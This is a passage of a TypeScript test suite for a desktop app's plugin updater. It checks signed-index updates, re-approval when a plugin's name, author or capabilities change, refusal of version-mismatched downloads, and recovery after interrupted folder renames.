  /** luna 1.0.0 from `index` (the official one by default), OK'd; `next` lists another version there. */
  async function installed(o: { community?: boolean; indexAutoUpdate?: "official" | "all"; rename?: (from: string, to: string) => void } = {}) {
    const w = await world({ ...(o.indexAutoUpdate ? { indexAutoUpdate: o.indexAutoUpdate } : {}), ...(o.rename ? { rename: o.rename } : {}) });
    const signer = o.community ? testKey() : w.key;
    const url = o.community ? COMMUNITY : OFFICIAL;
    if (o.community) w.opened.indexes!.add(COMMUNITY, [signer.hex]);
    const listed: { version: string; hash: string; url: string }[] = [];
    let seq = 0;
    const next = async (version: string, entries: TarEntry[]) => {
      const hash = await hashOf(entries);
      w.files.set(`https://x.test/luna-${version}.tgz`, tgz(entries));
      listed.push({ version, hash, url: `https://x.test/luna-${version}.tgz` });
      w.publish(signer.priv, url, indexOf(++seq, [{ id: "luna", versions: listed }]));
      await w.opened.indexes!.refresh();
      return hash;
    };
    const hash1 = await next("1.0.0", v("1.0.0"));
    await w.install({ id: "luna", ...(o.community ? { index: COMMUNITY } : {}) });
    await w.opened.registry.approve("luna", hash1);
    return { w, hash1, next };
  }

  test("an added index's update is offered, never applied on its own; asked for, it applies on the OK; with the switch at all, it applies", async () => {
    const { w, next } = await installed({ community: true });
    try {
      const hash2 = await next("1.1.0", v("1.1.0", {}, "echo hello"));
      expect(await update(w)).toEqual({ updated: [], offered: [{ id: "luna", from: "1.0.0", to: "1.1.0", why: "updates from an index you added are offered, not applied on their own" }] });
      expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash2, okHash: hash2 });
    } finally {
      w.opened.close();
    }
    const all = await installed({ community: true, indexAutoUpdate: "all" });
    try {
      await all.next("1.1.0", v("1.1.0", {}, "echo hello"));
      expect((await update(all.w)).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
    } finally {
      all.w.opened.close();
    }
  });

  test("the OK snapshot moves to the carried-over tree: the next change is judged against it, not the first version", async () => {
    const { w, next } = await installed();
    try {
      const hash2 = await next("1.1.0", v("1.1.0", { capabilities: [] }, "echo hello"));
      await update(w);
      expect(w.opened.store.loadOk("luna")?.okHash).toBe(hash2);
      // 1.2.0 adds nothing over 1.1.0: it carries over too.
      const hash3 = await next("1.2.0", v("1.2.0", {}, "echo again"));
      expect((await update(w)).updated).toEqual([{ id: "luna", from: "1.1.0", to: "1.2.0" }]);
      expect(w.opened.store.loadOk("luna")?.okHash).toBe(hash3);
    } finally {
      w.opened.close();
    }
  });

  test("a new name or author is a trigger: it can't rename itself to look like another plugin without a new OK", async () => {
    const { w, next } = await installed();
    try {
      await next("1.1.0", v("1.1.0", { name: "Clover Settings" }));
      expect((await update(w)).offered?.[0]?.why).toBe("it asks for your OK again: it changes its name or its author");
    } finally {
      w.opened.close();
    }
    const again = await installed();
    try {
      await again.next("1.1.0", v("1.1.0", { author: { name: "waifucave" } }));
      expect((await update(again.w)).offered?.[0]?.why).toBe("it asks for your OK again: it changes its name or its author");
    } finally {
      again.w.opened.close();
    }
  });

  test("newer is the version recorded at install, which the manifest must match: a listed version whose manifest says another is refused at install and at update", async () => {
    const w = await world();
    try {
      const lying = v("9.9.9");
      const hash = await hashOf(lying);
      w.files.set("https://x.test/lying.tgz", tgz(lying));
      w.publish(w.key.priv, OFFICIAL, indexOf(1, [{ id: "luna", versions: [{ version: "1.0.0", hash, url: "https://x.test/lying.tgz" }] }]));
      await w.opened.indexes!.refresh();
      expect(await w.refused({ id: "luna" })).toContain('the download says it is version "9.9.9", not 1.0.0 as listed');
    } finally {
      w.opened.close();
    }
    const { w: u, next } = await installed();
    try {
      await next("1.1.0", v("1.0.5"));
      expect((await update(u)).failed?.[0]?.why).toContain('the download says it is version "1.0.5", not 1.1.0 as listed');
      expect(u.opened.registry.get("luna")!.provenance.index?.version).toBe("1.0.0");
    } finally {
      u.opened.close();
    }
  });

  test("one check at a time: the user's check for a plugin waits for the automatic one; one swap, the OK'd tree kept once", async () => {
    const { w, hash1, next } = await installed();
    try {
      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
      const [auto, asked] = await Promise.all([w.opened.updater!.check(), update(w, "luna"), update(w, "luna").catch((e: Error) => e.message)]);
      expect(auto.offered.map((x) => x.id)).toEqual(["luna"]);
      expect(asked.updated).toEqual([{ id: "luna", from: "1.0.0", to: "2.0.0" }]);
      expect(plugins(w).filter((n) => n.startsWith(".luna.previous-")).length).toBe(1);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "found", treeHash: hash2 });
      // Another ask while its card waits is refused.
      expect(await update(w, "luna").then(() => "updated", (e: Error) => e.message)).toContain("waiting for your OK");
      await w.opened.registry.refuse("luna");
      for (let i = 0; i < 50 && w.opened.registry.get("luna")?.treeHash !== hash1; i++) await Bun.sleep(20);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1 });
    } finally {
      w.opened.close();
    }
  });

  test("a restart while the new version waits for its card keeps the previous one; a refusal after it brings it back", async () => {
    const { w, hash1, next } = await installed();
    try {
      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
      await update(w, "luna");
      await w.reopen();
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "found", treeHash: hash2 });
      expect(plugins(w).filter((n) => n.startsWith(".luna.previous-")).length).toBe(1);
      await w.opened.registry.refuse("luna");
      for (let i = 0; i < 50 && w.opened.registry.get("luna")?.treeHash !== hash1; i++) await Bun.sleep(20);
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1, provenance: { index: { version: "1.0.0" } } });
      expect(plugins(w)).toEqual(["luna"]);
      expect(w.opened.indexes!.updating()).toEqual({});
    } finally {
      w.opened.close();
    }
  });

  test("a crash between the renames: at start the previous version is put back, before any folder is read", async () => {
    const { w, hash1 } = await installed();
    try {
      // As #swap leaves it after its first rename: the record written, the plugin's folder moved aside, then Clover stops.
      const name = ".luna.previous-0123456789ab";
      w.opened.indexes!.setUpdating("luna", { previous: name, treeHash: hash1, provenance: { by: "user-app", at: 0, index: { url: OFFICIAL, version: "1.0.0" } }, to: `sha256:${"0".repeat(64)}` });
      await Bun.sleep(100); // the write counters reach the secret store
      w.opened.close();
      renameSync(join(w.home, "plugins", "luna"), join(w.home, "plugins", name));
      await w.reopen();
      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1 });
      expect(plugins(w)).toEqual(["luna"]);
      expect(w.opened.indexes!.updating()).toEqual({});
    } finally {
      w.opened.close();
    }
  });

  test("removing a plugin forgets this computer's pin and override for its id; a later install under it isn't pinned", async () => {
    const { w, hash1 } = await installed();
    try {
      await w.m["plugin.pin"]!({ id: "luna", pinned: true }, APP);
      w.opened.indexes!.setOverride("luna", hash1);
      await w.m["plugin.remove"]!({ id: "luna" }, APP);
      expect([w.opened.indexes!.isPinned("luna"), w.opened.indexes!.overrides().luna]).toEqual([false, undefined]);
      const again = await w.install({ id: "luna" });
      expect(again.state).toBe("found");
      expect(w.opened.registry.get("luna")!.okHash).toBeUndefined();
    } finally {
      w.opened.close();
    }
  });

  test("a restore whose rename fails: no leftovers recorded, the keys stay, and the next start puts the previous version back with its provenance", async () => {
    let failRestore = false;
    const rename = (from: string, to: string) => {
      if (failRestore && /\.luna\.previous-/.test(from)) throw Object.assign(new Error("EBUSY"), { code: "EBUSY" });
      renameSync(from, to);
    };
    const { w, hash1, next } = await installed({ rename });
    try {
      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
      await w.opened.registry.approve("luna", hash1);
      await update(w, "luna");
      expect(w.opened.registry.get("luna")?.treeHash).toBe(hash2);
      failRestore = true;
      await w.opened.registry.refuse("luna");
      for (let i = 0; i < 50 && existsSync(join(w.home, "plugins", "luna")); i++) await Bun.sleep(20);
      await w.opened.folders.refresh(join(w.home, "plugins", "luna"));
      expect(existsSync(join(w.home, "plugins", "luna"))).toBe(false);
      // The update's record stays, so the folder's going records no leftovers (nothing will be forgotten).
      expect(Object.keys(w.opened.indexes!.updating())).toEqual(["luna"]);
      expect(w.opened.indexes!.leftBy("luna")).toBeUndefined();
      failRestore = false;
      await w.reopen();
      for (let i = 0; i < 50 && w.opened.registry.get("luna")?.provenance.index === undefined; i++) await Bun.sleep(20);
      expect(w.opened.registry.get("luna")).toMatchObject({ treeHash: hash1, provenance: { index: { url: OFFICIAL, version: "1.0.0" } } });
      expect(w.opened.indexes!.updating()).toEqual({});
      expect(plugins(w)).toEqual(["luna"]);
    } finally {
      w.opened.close();
    }
  });

  test("a folder from an index gone by hand records the index's signing keys; the same index, a key in common, keeps what it left", async () => {
    const { w } = await installed();
    try {
      rmSync(join(w.home, "plugins", "luna"), { recursive: true, force: true });
      await w.opened.folders.refresh(join(w.home, "plugins", "luna"));
      expect(w.opened.indexes!.leftBy("luna")).toMatchObject({ keys: [w.key.hex], provenance: { index: { url: OFFICIAL } } });
      await w.install({ id: "luna" });
      expect(w.opened.indexes!.leftBy("luna")).toBeUndefined();
    } finally {
      w.opened.close();
    }
  });

  test("npm: abbreviated metadata asked for; a legacy mixed-case name refused", async () => {
    const w = await world();
    try {
      await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP).catch(() => undefined);
      expect(w.headers.get("https://registry.npmjs.org/clover-luna")).toEqual({ accept: "application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8" });
      const mixed = await w.m["plugin.install"]!({ source: { from: "npm", name: "JSONStream" } }, APP).then(() => "installed", (e: Error) => e.message);
      expect(mixed).toContain("isn't an npm package name");
    } finally {
      w.opened.close();
    }
  });
});
